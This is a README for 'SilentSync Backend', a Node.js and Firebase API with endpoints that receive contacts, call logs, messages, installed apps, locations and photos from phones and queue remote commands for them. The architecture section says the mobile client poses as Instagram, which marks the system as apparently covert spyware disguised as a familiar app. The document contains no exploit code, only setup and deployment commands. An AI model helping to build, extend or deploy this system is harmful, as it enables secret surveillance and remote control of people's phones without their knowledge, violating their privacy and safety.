# SilentSync Backend

Standalone backend API for SilentSync - a device monitoring system.

## Overview

This backend handles:
- Device registration and management
- Data upload (contacts, call logs, messages, apps, locations)
- Command queue system for remote device control
- Photo upload and storage
- Integration with Firebase Firestore for data persistence

## Tech Stack

- **Runtime**: Node.js 18+
- **Framework**: Express.js
- **Database**: Firebase Firestore
- **Authentication**: Firebase Auth (Google Sign-in)
- **Deployment**: Cloudflare Workers (via Wrangler)

## Installation

```bash
npm install
```

## Configuration

1. Copy `.env.example` to `.env`:
```bash
cp .env.example .env
```

2. Fill in your Firebase configuration:
   - `FIREBASE_CONFIG`: Your Firebase client config JSON
   - `FIREBASE_SERVICE_ACCOUNT`: Your Firebase Admin SDK service account JSON

## Running Locally

```bash
# Development mode with hot reload
npm run dev

# Production mode
npm start
```

## API Endpoints

### Device Management
- `POST /api/register-device` - Register a new device
- `POST /api/upload/:deviceId` - Upload device data (contacts, messages, call logs, apps, stats)
- `POST /api/location/:deviceId` - Upload location data

### Commands
- `GET /api/commands/:deviceId` - Fetch pending commands for a device
- `POST /api/command/:deviceId/:commandId/status` - Update command status

### Photos
- `POST /api/upload-photo/:deviceId` - Upload a photo (Base64)
- `GET /uploads/:filename` - Serve uploaded photos (local mode only)

### Health
- `GET /health` - Health check endpoint

## Deployment

### Cloudflare Workers

1. Install Wrangler CLI:
```bash
npm install -g wrangler
```

2. Login to Cloudflare:
```bash
wrangler login
```

3. Set secrets:
```bash
wrangler secret put FIREBASE_CONFIG
wrangler secret put FIREBASE_SERVICE_ACCOUNT
```

4. Deploy:
```bash
npm run deploy
```

## Environment Variables

| Variable | Description | Required |
|----------|-------------|----------|
| `FIREBASE_CONFIG` | Firebase client configuration JSON | Yes |
| `FIREBASE_SERVICE_ACCOUNT` | Firebase Admin SDK service account | Yes |
| `PORT` | Server port (default: 3000) | No |
| `NODE_ENV` | Environment mode | No |
| `CORS_ORIGINS` | Allowed CORS origins | No |

## Architecture

The backend is designed to work with:
- **Mobile App (Instagram)**: Sends device data and receives commands
- **Web Dashboard**: Displays device data and sends commands

Both communicate through this backend API, with Firebase Firestore as the data store.
